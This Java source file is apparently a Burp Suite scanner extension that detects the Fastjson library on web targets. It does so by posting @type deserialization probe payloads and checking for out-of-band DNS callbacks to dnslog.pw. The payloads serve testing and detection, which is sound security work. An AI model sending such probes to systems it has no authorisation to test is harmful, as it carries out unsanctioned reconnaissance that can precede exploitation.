package com.ext.scanner;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.ScanCheck;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;


public class FastJsonScanner implements ScanCheck {
    private MontoyaApi api;
    private String prefix;
    private String token;

    public FastJsonScanner(MontoyaApi api, String prefix, String token) {
        this.api = api;
        this.prefix = prefix;
        this.token = token;
    }

    private String[] payload = new String[]{
            //host dnslog检测
            "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"%s\"}}",
            //http方式检测
            "{{\"@type\":\"java.net.URL\",\"val\":\"http://%s\"}:\"a\"}",
            // 异常回显
            "{\"@type\": \"java.lang.AutoCloseable\"\n"
    };

    public FastJsonScanner(MontoyaApi api) {
        this.api = api;
    }

    @Override
    public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint) {
        return AuditResult.auditResult(processRequests(baseRequestResponse.request()));
    }

    @Override
    public AuditResult passiveAudit(HttpRequestResponse baseRequestResponse) {
        return AuditResult.auditResult(processRequests(baseRequestResponse.request()));

    }

    @Override
    public ConsolidationAction consolidateIssues(AuditIssue newIssue, AuditIssue existingIssue) {
        if (newIssue.baseUrl() == existingIssue.baseUrl()) return null;
        return ConsolidationAction.KEEP_EXISTING;
    }

    /***
     * 处理请求，添加payload
     * @param httpRequest 请求
     * @return AuditIssue
     */
    private List<AuditIssue> processRequests(HttpRequest httpRequest){
        UUID uuid = UUID.randomUUID();
        api.logging().logToOutput(httpRequest.bodyToString());
        List<HttpRequestResponse> list = new ArrayList<>();
        String formatted = "";
        for (String s : payload) {
            if (s.contains("http")){
                 formatted = s.formatted(uuid +".8ak4rc6p.dnslog.pw");
            }
            else {
                formatted = s.formatted(uuid + ".8ak4rc6p.dnslog.pw");
            }
            HttpRequestResponse post = api.http().sendRequest(httpRequest.withBody(formatted).withMethod("POST").withAddedHeader("Content-Type", "application/json")
                    .withPath(httpRequest.path()));
            list.add(post);
        }
        return checkRes(list,uuid);
    }

    /***
     * 检查dnslog结果
     * @param list 请求列表
     * @return AuditIssue
     */
    private List<AuditIssue> checkRes(List<HttpRequestResponse> list,UUID uuid){
        List<AuditIssue> auditIssues = new ArrayList<>();
        String baseUrl = "";
        for (HttpRequestResponse httpRequestResponse : list) {
            String s = httpRequestResponse.response().bodyToString();
            baseUrl = httpRequestResponse.url();
            if (getDnsLog(uuid) || s.toLowerCase().contains("fastjson")){
                auditIssues.add(AuditIssue.auditIssue("fastjson", "use fastjson", "", baseUrl, AuditIssueSeverity.HIGH
                        , AuditIssueConfidence.CERTAIN, "", "", AuditIssueSeverity.HIGH, httpRequestResponse));
            }
        }
        return auditIssues;
    }

    public Boolean getDnsLog(UUID uuid){
        HttpRequest httpRequest = HttpRequest.httpRequestFromUrl("http://dnslog.pw/api/dns/" + prefix +"/" + uuid +"/?token=" + token + "");
        api.logging().logToOutput(httpRequest.url());
        HttpRequestResponse httpRequestResponse = api.http().sendRequest(httpRequest);
        api.logging().logToOutput(httpRequestResponse.response().bodyToString());
        return httpRequestResponse.response().bodyToString().equals("True");
    }
}
